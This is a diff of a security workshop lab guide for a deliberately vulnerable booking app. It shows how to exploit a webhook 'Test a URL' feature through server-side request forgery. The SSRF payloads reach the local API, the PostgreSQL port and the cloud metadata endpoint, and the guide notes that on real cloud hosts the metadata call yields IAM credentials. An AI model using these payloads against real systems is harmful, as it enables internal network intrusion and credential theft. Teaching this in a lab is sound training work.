@@ -26,32 +26,47 @@ Common SSRF entry points: webhook URL fields, image/avatar fetch-by-URL, PDF gen
 
 ---
 
-## Setup
+## Step 1 — Exploit SSRF via the UI
 
-```bash
-docker compose up -d
-dotnet run --project src/BookingDojo.Api &
-dotnet run --project src/BookingDojo.Bff &
-cd src/bookingdojo-ui && npm run dev &
+Log in as `partner / Partner1234!` and navigate to **Integrations**.
+
+The page has two sections: **Webhooks** (save a URL permanently) and **Test a URL** (one-off probe). Use **Test a URL** for the attacks below — the server response is shown directly in the browser.
+
+### Probe the local API
+
+In the **URL** field under **Test a URL**, enter:
+
+```
+http://localhost:5000/api/auth/login
 ```
 
-In `appsettings.json`:
+Click **Send Test**. The server response panel shows the API's own login endpoint response — confirming the internal service is reachable from the server's network even though your browser couldn't reach `localhost:5000` directly (it would hit your machine, not the server's loopback).
 
-```json
-"WebhookSsrf": "Vulnerable"
+### Probe the database port
+
+Enter:
+
+```
+http://localhost:5432/
 ```
 
-Log in:
+Click **Send Test**. The response shows PostgreSQL's greeting banner or a connection error — either way confirming the database host and port from outside the network.
 
-```bash
-curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"partner","password":"Partner1234!"}' | jq .
+### Cloud metadata endpoint
+
+Enter:
+
 ```
+http://169.254.169.254/latest/meta-data/
+```
+
+Click **Send Test**. On AWS this returns IAM role names. In the workshop environment you'll see a connection timeout or refused — but on a real cloud instance this returns credentials.
+
+All three probes show the server's response rendered in the browser with no extra tools required.
 
 ---
 
-## Step 1 — Normal webhook test
+## Step 2 — Normal webhook test via curl
 
 A legitimate webhook test to an external server:
 
@@ -65,22 +80,7 @@ The server POSTs `{"event":"booking.created","test":true}` to the URL and return
 
 ---
 
-## Step 2 — Probe the local API
-
-The API server listens on `localhost:5000`. From the internet, that port is firewalled. But the server can reach itself:
-
-```bash
-# Read the API's own health or auth endpoint
-curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
-  -H "Content-Type: application/json" \
-  -d '{"url":"http://localhost:5000/api/auth/login"}' | jq .
-```
-
-The server POSTs to its own login endpoint and returns the response — confirming the internal service is reachable and showing its response format.
-
----
-
-## Step 3 — Probe the database port
+## Step 3 — Probe the database port via curl
 
 The PostgreSQL database listens on `localhost:5432`. From the internet, it is unreachable. From the server's loopback interface, it is:
 
@@ -94,7 +94,7 @@ Expected: the server connects to port 5432 and returns whatever PostgreSQL sends
 
 ---
 
-## Step 4 — Cloud metadata endpoint
+## Step 4 — Cloud metadata endpoint via curl
 
 On AWS (and compatible clouds), the instance metadata service at `169.254.169.254` returns IAM role credentials, user data scripts, and configuration — all accessible without any authentication from within the instance:
 
